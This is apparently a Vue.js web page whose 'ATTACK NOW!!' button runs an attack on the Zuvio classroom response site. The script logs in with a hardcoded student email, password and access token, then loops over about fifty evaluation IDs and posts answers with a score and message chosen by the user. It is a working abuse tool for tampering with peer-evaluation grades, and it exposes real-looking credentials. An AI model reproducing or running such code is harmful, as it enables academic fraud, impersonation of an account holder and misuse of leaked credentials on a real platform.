<template>
  <v-app justify="center" align="center">
    <v-container fill-height>
      <v-card
        bg
        fill-height
        grid-list-md
        text-xs-center
        row
        wrap
        align-center
        class="mx-auto"
        max-width="600"
        justify-center
        justify="center"
      >
        <mainImage />

        <v-card-subtitle class="pb-0">Xanonymous</v-card-subtitle>

        <v-card-text class="text--primary">
          <div class="my-4" style="font-size:1.7em">
            按下按鈕，神奇的事情將會發生。
          </div>

          <div>純屬娛樂，請勿自行嘗試。</div>
        </v-card-text>
        <v-col cols="12" sm="6">
          <v-text-field
            v-model="password"
            :append-icon="show1 ? 'mdi-eye' : 'mdi-eye-off'"
            :rules="[rules.required, rules.min]"
            :type="show1 ? 'text' : 'password'"
            name="input-10-1"
            label="請輸入攻擊執行確認碼"
            v-if="!verified"
            @click:append="show1 = !show1"
          ></v-text-field>
          <div class="my-2">
            <v-btn
              v-if="!verified"
              dark
              depressed
              @click="verifiedNow"
              class="deep-purple accent-4"
              ><v-icon>mdi-card-search</v-icon><b>驗證攻擊碼</b></v-btn
            >
          </div>
        </v-col>
        <p v-if="attackStatus" class="white--text green"><b>攻擊完畢！</b></p>
        <v-card-actions justify="center" align="center">
          <v-btn
            block
            align="center"
            justify-center
            center
            x-large
            color="success"
            :disabled="!(attackStatus === false && verified === true)"
            v-if="verified"
            @click="attackClicked"
            ><v-icon class="mx-2">mdi-crosshairs-gps</v-icon>ATTACK NOW!!</v-btn
          >
        </v-card-actions>
      </v-card>
    </v-container>
  </v-app>
</template>

<script>
// @ is an alias to /src
const mainImage = () => import("@/components/mainImage");
import Axios from "axios";
Axios.defaults.withCredentials = true;
const api = Axios.create({
  baseURL: "https://irs.zuvio.com.tw/",
  headers: {
    referer:
      "https://irs.zuvio.com.tw/student5/irs/evaluation/7308955/2761672/",
    origin: "https://irs.zuvio.com.tw",
    "Content-Type": "application/json"
  },
  withCredentials: true
});
export default {
  name: "home",
  components: {
    mainImage
  },
  data: () => ({
    attackStatus: false,
    verified: false,
    password: "",
    show1: false,
    scoreUWant: 0,
    msg: "",
    inputStatus: true,
    rules: {
      required: value => !!value || "請輸入密碼",
      min: v => v.length >= 8 || "至少8個字"
    }
  }),
  methods: {
    verifiedNow() {
      if (this.password === "0202494c0063") {
        this.verified = true;
      } else {
        if (this.inputStatus) {
          this.scoreUWant = Number(this.password);
          this.inputStatus = !this.inputStatus;
        } else {
          this.msg = this.password;
          this.inputStatus = !this.inputStatus;
        }
      }
    },
    attackClicked() {
      if (!this.attackStatus) {
        this.loginGET();
        this.loginPOST();
        for (let i = 2761670; i <= 2761720; i++) {
          this.attackPOST(i);
        }
        this.attackStatus = true;
        this.$vuetify.theme.dark = true;
      }
    },
    async loginGET() {
      await api.get("/irs/login");
    },
    async loginPOST() {
      let bodyFormData = new FormData();
      bodyFormData.append("email", "t108820039@ntut.edu.tw");
      bodyFormData.append("password", "123");
      await api.post("/irs/submitLogin", bodyFormData);
    },
    async attackPOST(i) {
      let answers = [
        { id: "400875", answer: this.msg, score: this.scoreUWant }
      ];
      let my_data = {
        url: "https://irs.zuvio.com.tw" + "/app_v2/answerEvaluation",
        type: "POST",
        data: {
          user_id: 2038529,
          accessToken: "2f308705618ccf7c6046aa2f45b719365c7a0908",
          question_id: 7308955,
          evaluation_id: i,
          answers: answers,
          device: "STUDENT_WEB"
        },
        dataType: "json"
      };
      await $.ajax(my_data);
    }
  }
};
</script>
